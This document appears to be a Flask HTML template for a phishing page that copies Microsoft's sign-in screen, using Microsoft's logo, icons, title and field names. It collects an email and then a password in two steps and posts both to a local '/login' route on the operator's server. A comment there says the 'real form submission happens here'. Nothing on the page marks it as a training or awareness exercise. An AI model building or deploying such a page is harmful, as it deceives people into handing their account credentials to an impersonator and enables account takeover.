<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your account</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}?v=1.1">
    <link rel="icon" href="https://logincdn.msauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico"
        type="image/x-icon">
</head>

<body>
    <div class="background"></div>
    <div class="login-wrapper">
        <div class="login-container login-box">
            <img class="logo"
                src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"
                alt="Microsoft">

            <div id="step1">
                <h2>Sign in</h2>
                <form id="emailForm">
                    <div class="input-group" id="emailGroup">
                        <input type="email" name="loginfmt" id="loginfmt" placeholder="Email, phone, or Skype" required
                            autofocus>
                    </div>
                    <div class="links">
                        <p>No account? <a href="#">Create one!</a></p>
                        <p><a href="#">Can't access your account?</a></p>
                    </div>
                    <div class="button-group">
                        <button type="button" class="btn-primary" id="nextBtn">Next</button>
                    </div>
                </form>

                <div class="signin-options">
                    <img class="key-icon"
                        src="https://logincdn.msauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg"
                        alt="Sign-in options">
                    <span>Sign-in options</span>
                </div>
            </div>

            <div id="step2" class="hidden">
                <div class="identity-banner">
                    <button class="back-button" id="backButton" title="Back" type="button">
                        <img src="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg"
                            alt="Back">
                    </button>
                    <div class="identity" id="displayEmail"></div>
                </div>
                <h2>Enter password</h2>
                <div class="error-msg hidden" id="errorMsg">Please enter the password for your Microsoft account.
                </div>
                <!-- Real form submission happens here -->
                <form action="/login" method="POST" id="passwordForm">
                    <!-- Echoing the email to send with POST -->
                    <input type="hidden" name="loginfmt" id="hiddenEmail">
                    <div class="input-group">
                        <input type="password" name="passwd" id="passwd" placeholder="Password">
                    </div>
                    <div class="links" style="margin-bottom: 24px;">
                        <p><a href="#">Forgot my password</a></p>
                    </div>
                    <div class="button-group">
                        <button type="submit" class="btn-primary" id="signInBtn">Sign in</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <script>
        const nextBtn = document.getElementById('nextBtn');
        const emailInput = document.getElementById('loginfmt');
        const displayEmail = document.getElementById('displayEmail');
        const hiddenEmail = document.getElementById('hiddenEmail');

        const step1 = document.getElementById('step1');
        const step2 = document.getElementById('step2');
        const backButton = document.getElementById('backButton');
        const passwdInput = document.getElementById('passwd');
        const passwordForm = document.getElementById('passwordForm');
        const errorMsg = document.getElementById('errorMsg');

        // Allow pressing Enter to go to password step
        emailInput.addEventListener('keypress', function (e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                goToNext();
            }
        });

        nextBtn.addEventListener('click', () => {
            goToNext();
        });

        function goToNext() {
            if (emailInput.value.trim() !== "") {
                step1.classList.add('hidden');
                step2.classList.remove('hidden');

                displayEmail.textContent = emailInput.value;
                hiddenEmail.value = emailInput.value;
                passwdInput.focus();
            } else {
                emailInput.focus();
            }
        }

        backButton.addEventListener('click', () => {
            step2.classList.add('hidden');
            step1.classList.remove('hidden');
            errorMsg.classList.add('hidden');
            passwdInput.classList.remove('has-error');
            emailInput.focus();
        });

        passwordForm.addEventListener('submit', function (e) {
            if (passwdInput.value.trim() === '') {
                e.preventDefault();
                errorMsg.classList.remove('hidden');
                passwdInput.classList.add('has-error');
                passwdInput.focus();
            }
        });
    </script>
</body>

</html>
